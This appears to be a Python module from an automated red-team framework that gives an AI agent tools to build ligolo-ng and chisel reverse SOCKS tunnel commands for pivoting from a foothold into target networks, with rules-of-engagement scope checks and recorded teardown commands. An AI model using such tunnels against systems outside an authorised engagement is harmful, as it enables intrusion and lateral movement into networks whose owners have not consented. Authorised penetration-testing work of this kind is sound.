"""Tunnel tools: ligolo-ng and chisel (Phase 5, spec §5.3).

Both are long-running interactive clients, so — like Phase 4's
foothold-shell tools — the AutoRed side builds the command, saves it
as raw evidence, and records a :class:`TunnelConfig` carrying a
**working teardown command** (the Cleanup Agent runs it verbatim).
The actual long-running process bring-up is operator-supervised /
Phase 6 session-manager territory; teardown is functional today
(``pkill`` runs locally).

``ligolo_connect`` names its endpoint argument ``proxy_ip`` so the
RoE Guard's generic IP-scope check (extended in Task 1 to honour
``proxy_ip``) applies to the tunnel endpoint.

Decorator order (Ruling 1): ``@tool`` OUTER, ``@roe_guard`` INNER — see
``autored.tools.hydra`` for the rationale and the regression tests in
``test_<tool>_ainvoke_works_with_roe_guard``.
"""
from __future__ import annotations

import os

from langchain_core.tools import tool
from pydantic import BaseModel

from autored.logging import get_logger
from autored.models.lateral import TunnelConfig
from autored.roe_guard import roe_guard
from autored.tools.nmap import _save_raw

log = get_logger("tools.tunnel")


class TunnelResult(BaseModel):
    """Result of a tunnel bring-up (command + recorded config)."""

    command_built: str
    tunnel_config: TunnelConfig
    success: bool = True
    raw_output_path: str = ""


def _autored_lhost() -> str:
    """AutoRed host IP tunnels point back at (AUTORED_LHOST override)."""
    return os.environ.get("AUTORED_LHOST", "127.0.0.1")


def _build_ligolo_cmd(proxy_ip: str, proxy_port: int) -> list[str]:
    """Build the ligolo-ng client argv."""
    return [
        "ligolo-ng", "--connect", f"{proxy_ip}:{proxy_port}", "--ignore-cert",
    ]


def _build_chisel_cmd(lhost: str, lport: int) -> list[str]:
    """Build the chisel client argv (reverse SOCKS pivot)."""
    return ["chisel", "client", f"{lhost}:{lport}", "R:socks"]


def _config_from_ligolo(proxy_ip: str, proxy_port: int) -> TunnelConfig:
    return TunnelConfig(
        tool="ligolo",
        proxy_endpoint=f"{proxy_ip}:{proxy_port}",
        local_port=proxy_port,
        target_network="0.0.0.0/0",
        teardown_command="pkill -f ligolo-ng",
    )


def _config_from_chisel(lhost: str, lport: int, target_network: str) -> TunnelConfig:
    return TunnelConfig(
        tool="chisel",
        proxy_endpoint=f"{lhost}:{lport}",
        local_port=lport,
        target_network=target_network,
        teardown_command=f"pkill -f 'chisel client {lhost}:{lport}'",
    )


@tool
@roe_guard(allowed_categories=["tunnel"])
async def ligolo_connect(
    proxy_ip: str,
    proxy_port: int = 11601,
    engagement_id: str = "",
) -> TunnelResult:
    """Bring up a ligolo-ng tunnel to a proxy endpoint.

    Args:
        proxy_ip: Ligolo proxy IP (scope-checked by the RoE Guard).
        proxy_port: Ligolo proxy port (default 11601).
        engagement_id: Current engagement ID.

    Returns:
        TunnelResult with the recorded TunnelConfig (incl. teardown).
    """
    cmd = _build_ligolo_cmd(proxy_ip, proxy_port)
    cfg = _config_from_ligolo(proxy_ip, proxy_port)
    log.info("ligolo_connect", endpoint=cfg.proxy_endpoint)
    raw_path = await _save_raw(
        "ligolo", proxy_ip, " ".join(cmd), "", engagement_id,
    )
    return TunnelResult(
        command_built=" ".join(cmd), tunnel_config=cfg, raw_output_path=raw_path,
    )


@tool
@roe_guard(allowed_categories=["tunnel"])
async def chisel_reverse(
    lhost: str = "",
    lport: int = 1080,
    target_network: str = "0.0.0.0/0",
    engagement_id: str = "",
) -> TunnelResult:
    """Bring up a chisel reverse SOCKS tunnel to the AutoRed host.

    Args:
        lhost: AutoRed host IP the tunnel calls back to (defaults to
            the ``AUTORED_LHOST`` env var).
        lport: Local SOCKS port (default 1080).
        target_network: CIDR reachable through the tunnel.
        engagement_id: Current engagement ID.

    Returns:
        TunnelResult with the recorded TunnelConfig (incl. teardown).
    """
    host = lhost or _autored_lhost()
    cmd = _build_chisel_cmd(host, lport)
    cfg = _config_from_chisel(host, lport, target_network)
    log.info("chisel_reverse", endpoint=cfg.proxy_endpoint)
    raw_path = await _save_raw(
        "chisel", host, " ".join(cmd), "", engagement_id,
    )
    return TunnelResult(
        command_built=" ".join(cmd), tunnel_config=cfg, raw_output_path=raw_path,
    )
